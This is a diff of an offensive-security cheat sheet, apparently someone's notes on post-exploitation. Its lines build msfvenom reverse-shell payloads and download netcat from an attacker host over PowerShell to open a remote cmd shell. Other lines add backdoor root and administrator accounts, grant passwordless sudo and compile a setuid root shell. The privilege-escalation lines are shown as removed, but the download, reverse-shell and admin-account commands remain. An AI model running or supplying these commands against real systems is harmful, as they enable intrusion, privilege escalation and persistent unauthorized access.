@@ -229,25 +229,15 @@ Metasploit
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f asp > dropthebomb.asp
   msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe > dropthebomb.exe
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f asp > dropthebomb.asp
-/etc/passwd
-  openssl passwd evil # Generate the password hash that's used by Linux systems
-  echo 'root2:$1$kRKiXOJf$5PArktC3Czg5WLOAiXQ7r/:0:0:root:/root:/bin/bash' >> /etc/passwd
-•	Sudoers
-o	echo target ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers
-•	Shell.c
-o	echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/thebomb.c
-o	
-o	gcc /tmp/mountme/thebomb.c -o /tmp/mountme/thebomb
-o	
-o	chmod +s /tmp/mountme/thebomb
-•	CMD
-o	powershell -c iwr http://10.10.10.11:8000/nc64.exe -O c:\Windows\temp\nc64.exe #When in shell mode, we can directly run this!
-•	
-o	c:\Windows\temp\nc64.exe 10.10.10.11 443 -e cmd.exe
-•	CMD Add User to Administrators
-o	cmd.exe /k net localgroup administrators user /add
-•	Powershell — Add User to the Target Machine
-o	$user=New-LocalUser -AccountNeverExpires:$true -Password ( ConvertTo-SecureString -AsPlainText -Force 'NoPassw0rd') -Name "attacker" -FullName "Attacker" -Description "Local Administrator"
+
+CMD
+	powershell -c iwr http://10.10.10.11:8000/nc64.exe -O c:\Windows\temp\nc64.exe #When in shell mode, we can directly run this!
+	c:\Windows\temp\nc64.exe 10.10.10.11 443 -e cmd.exe
+
+CMD Add User to Administrators
+		cmd.exe /k net localgroup administrators user /add
+Powershell — Add User to the Target Machine
+		$user=New-LocalUser -AccountNeverExpires:$true -Password ( ConvertTo-SecureString -AsPlainText -Force 'NoPassw0rd') -Name "attacker" -FullName "Attacker" -Description "Local Administrator"
 o	
 o	Add-LocalGroupMember -Group "Administrators" -Member $user
 o	
